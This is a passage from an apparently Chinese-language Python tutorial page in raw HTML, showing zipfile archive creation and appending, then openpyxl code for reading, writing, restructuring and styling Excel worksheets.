class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>不要忘记pwd参数加b</p></blockquote><h3 id="创建压缩包"><a href="#创建压缩包" class="headerlink" title="创建压缩包"></a>创建压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilefile_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'extract/'</span><span class="token punctuation">]</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'new.zip'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        zipobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意with一行是w,即写入模式</p></blockquote><h3 id="向已有压缩包添加文件"><a href="#向已有压缩包添加文件" class="headerlink" title="向已有压缩包添加文件"></a>向已有压缩包添加文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'new.zip'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'sqli.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意with一行是a,即追加模式</p></blockquote><h2 id="处理excel文件"><a href="#处理excel文件" class="headerlink" title="处理excel文件"></a>处理excel文件</h2><h3 id="Excel表格术语"><a href="#Excel表格术语" class="headerlink" title="Excel表格术语"></a>Excel表格术语</h3><ul><li>行：row,从1开始计数</li><li>列：column</li><li>格子：cell</li><li>表：sheet</li></ul><h3 id="打开及读取表格数据"><a href="#打开及读取表格数据" class="headerlink" title="打开及读取表格数据"></a>打开及读取表格数据</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'Sheet1'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span>dimensions<span class="token punctuation">)</span>         <span class="token comment">#.dimensions是从左上角坐标到右下角坐标</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取一系列格子"><a href="#获取一系列格子" class="headerlink" title="获取一系列格子"></a>获取一系列格子</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>active                       <span class="token comment">#.active 打开活跃的/唯一的表格</span>cell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>row<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>column<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>coordinate<span class="token punctuation">)</span>cell<span class="token operator">=</span>sheet<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token comment">#根据坐标获取具体cell</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>row<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>column<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>coordinate<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A1:A3'</span><span class="token punctuation">]</span>                        <span class="token comment">#获取一系列格子</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span>                            <span class="token comment">#获取A列数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A:C'</span><span class="token punctuation">]</span>                          <span class="token comment">#获取A到C列数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>                              <span class="token comment">#获取第2行数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'2:3'</span><span class="token punctuation">]</span>                          <span class="token comment">#获取第2到3行数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#指定行和列的范围，按行获取</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token keyword">for</span> col <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>iter_cols<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#指定行和列的范围，按列获取</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>rows<span class="token punctuation">:</span>                      <span class="token comment">#所有行</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="向表格中写入内容"><a href="#向表格中写入内容" class="headerlink" title="向表格中写入内容"></a>向表格中写入内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'abc'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A2'</span><span class="token punctuation">]</span>cell<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">'aaa'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>要.save保存</p></blockquote><h4 id="插入一行"><a href="#插入一行" class="headerlink" title="插入一行"></a>插入一行</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activedata<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>    sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a>插入公式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>utils <span class="token keyword">import</span> FORMULAEworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">[</span><span class="token string">'B7'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'=AVERAGE(B1:B6)'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>FORMULAE<span class="token punctuation">)</span>                 <span class="token comment">#查看openpyxl支持的公式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入和删除一列、多列、一行、多行"><a href="#插入和删除一列、多列、一行、多行" class="headerlink" title="插入和删除一列、多列、一行、多行"></a>插入和删除一列、多列、一行、多行</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>insert_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#在idx列左边插入一列空的列</span>sheet<span class="token punctuation">.</span>insert_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#在idx列左边插入2列空的列</span>sheet<span class="token punctuation">.</span>insert_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#在idx行上边插入一行空的行</span>sheet<span class="token punctuation">.</span>insert_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#在idx行上边插入2行空的行</span>sheet<span class="token punctuation">.</span>delete_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#删除idx列    </span>sheet<span class="token punctuation">.</span>delete_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#删除从idx列开始，向右共2列</span>sheet<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#删除idx行    </span>sheet<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#删除从idx行开始，向下共2行</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="移动格子"><a href="#移动格子" class="headerlink" title="移动格子"></a>移动格子</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>move_range<span class="token punctuation">(</span><span class="token string">"A1:B2"</span><span class="token punctuation">,</span>rows<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token comment">#正整数为向下或向右，负整数为向左或向上</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建、删除、复制、改名sheet"><a href="#创建、删除、复制、改名sheet" class="headerlink" title="创建、删除、复制、改名sheet"></a>创建、删除、复制、改名sheet</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>create_sheet<span class="token punctuation">(</span><span class="token string">'sheet2'</span><span class="token punctuation">)</span>         <span class="token comment">#创建</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'sheet2'</span><span class="token punctuation">]</span>workbook<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>sheet<span class="token punctuation">)</span>                  <span class="token comment">#删除</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'Sheet1'</span><span class="token punctuation">]</span>workbook<span class="token punctuation">.</span>copy_worksheet<span class="token punctuation">(</span>sheet<span class="token punctuation">)</span>          <span class="token comment">#复制</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>             sheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'cool-sheet'</span>                <span class="token comment">#修改名称</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>          workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建新的Excel表格文件"><a href="#创建新的Excel表格文件" class="headerlink" title="创建新的Excel表格文件"></a>创建新的Excel表格文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbookworkbook<span class="token operator">=</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'firstsheet'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'newfile.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="冻结窗格"><a href="#冻结窗格" class="headerlink" title="冻结窗格"></a>冻结窗格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">import</span> randomworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>freeze_panes<span class="token operator">=</span><span class="token string">'B2'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加筛选"><a href="#添加筛选" class="headerlink" title="添加筛选"></a>添加筛选</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>auto_filter<span class="token punctuation">.</span>ref<span class="token operator">=</span>sheet<span class="token punctuation">.</span>dimensionsworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于样式"><a href="#关于样式" class="headerlink" title="关于样式"></a>关于样式</h3><h4 id="修改字体样式"><a href="#修改字体样式" class="headerlink" title="修改字体样式"></a>修改字体样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Fontworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A2'</span><span class="token punctuation">]</span>font<span class="token operator">=</span>Font<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'华文琥珀'</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>bold<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>italic<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FF0000'</span><span class="token punctuation">)</span>cell<span class="token punctuation">.</span>font<span class="token operator">=</span>font<span class="token keyword">print</span><span class="token punctuation">(</span>font<span class="token punctuation">.</span>name<span class="token punctuation">,</span>font<span class="token punctuation">.</span>size<span class="token punctuation">,</span>font<span class="token punctuation">.</span>bold<span class="token punctuation">,</span>font<span class="token punctuation">.</span>italic<span class="token punctuation">)</span>                           <span class="token comment">#获取字体信息</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置对齐样式"><a href="#设置对齐样式" class="headerlink" title="设置对齐样式"></a>设置对齐样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Alignmentworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A3'</span><span class="token punctuation">]</span>alignment<span class="token operator">=</span>Alignment<span class="token punctuation">(</span>horizontal<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span>vertical<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span>text_rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">,</span>wrap_text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#horizontal=水平对齐模式 vertical=垂直对齐模式 text_rotation=旋转角度 wrap_text=是否自动换行</span>cell<span class="token punctuation">.</span>alignment<span class="token operator">=</span>alignmentworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>水平对齐:’distributed’,’justify’,’center’,’left’,’fill’,’centerContinuous’,’right’,’general’<br>垂直对齐:’bottom’,’distributed’,’justify’,’center’,’top’</p></blockquote><h4 id="设置边框样式"><a href="#设置边框样式" class="headerlink" title="设置边框样式"></a>设置边框样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Side<span class="token punctuation">,</span>Borderworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A3'</span><span class="token punctuation">]</span>side1<span class="token operator">=</span>Side<span class="token punctuation">(</span>style<span class="token operator">=</span><span class="token string">'thin'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FF000000'</span><span class="token punctuation">)</span>       <span class="token comment">#style=边线样式,color=边线颜色</span>side2<span class="token operator">=</span>Side<span class="token punctuation">(</span>style<span class="token operator">=</span><span class="token string">'dotted'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FFFF0000'</span><span class="token punctuation">)</span>  border<span class="token operator">=</span>Border<span class="token punctuation">(</span>left<span class="token operator">=</span>side1<span class="token punctuation">,</span>right<span class="token operator">=</span>side2<span class="token punctuation">,</span>top<span class="token operator">=</span>side2<span class="token punctuation">,</span>bottom<span class="token operator">=</span>side1<span class="token punctuation">)</span>cell<span class="token punctuation">.</span>border<span class="token operator">=</span>borderworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置填充样式"><a href="#设置填充样式" class="headerlink" title="设置填充样式"></a>设置填充样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> PatternFill<span class="token punctuation">,</span>GradientFillworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>cell_a6<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A6'</span><span class="token punctuation">]</span>pattern_fill<span class="token operator">=</span>PatternFill<span class="token punctuation">(</span>fill_type<span class="token operator">=</span><span class="token string">'solid'</span><span class="token punctuation">,</span>fgColor<span class="token operator">=</span><span class="token string">'99ccff'</span><span class="token punctuation">)</span>   <span class="token comment">#fill_type=填充样式，fgColor=填充颜色</span>cell_a6<span class="token punctuation">.</span>fill<span class="token operator">=</span>pattern_fillcell_a7<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A7'</span><span class="token punctuation">]</span>gradient_fill<span class="token operator">=</span>GradientFill<span class="token punctuation">(</span>stop<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'FFFFFF'</span><span class="token punctuation">,</span><span class="token string">'99CCFF'</span><span class="token punctuation">,</span><span class="token string">'000000'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#stop=(渐变颜色1，渐变颜色2...)</span>cell_a7<span class="token punctuation">.</span>fill<span class="token operator">=</span>gradient_fillworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置行高和列宽"><a href="#设置行高和列宽" class="headerlink" title="设置行高和列宽"></a>设置行高和列宽</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>row_dimensions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">50</span>sheet<span class="token punctuation">.</span>column_dimensions<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">20</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="合并和取消合并单元格"><a href="#合并和取消合并单元格" class="headerlink" title="合并和取消合并单元格"></a>合并和取消合并单元格</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>merge_cells<span class="token punctuation">(</span><span class="token string">'C1:D2'</span><span 